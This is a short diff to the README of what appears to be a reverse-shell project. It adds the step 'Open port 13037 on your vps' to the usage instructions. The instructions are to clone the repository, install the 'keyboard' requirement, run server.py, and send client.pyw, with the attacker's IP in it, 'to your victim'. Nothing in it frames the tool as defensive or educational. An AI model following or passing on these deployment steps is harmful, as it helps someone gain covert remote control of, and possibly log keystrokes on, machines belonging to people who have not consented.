@@ -47,6 +47,7 @@ Contact :
 ```sh-session
 > Download zip file (git clone https://github.com/DictateurMiro/reverse-shell.git)
 > Install requirements (keyboard)
+> Open port 13037 on your vps
 > Run server.py
 > Send client.pyw (with the ip in the file) to your victim
 > Enjoy!
